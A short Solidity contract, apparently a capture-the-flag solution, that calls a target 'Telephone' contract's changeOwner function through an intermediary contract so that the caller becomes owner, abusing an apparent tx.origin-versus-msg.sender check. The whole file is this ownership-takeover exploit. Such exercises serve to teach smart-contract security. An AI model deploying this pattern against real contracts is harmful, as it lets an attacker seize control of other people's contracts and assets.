pragma solidity ^0.4.18;

contract Telephone {
    function changeOwner(address _owner) public;
}

contract TelephoneCaller {

    function callTelephone(address _telephone) public {
        Telephone telephone = Telephone(_telephone);
        telephone.changeOwner(msg.sender);
    }
}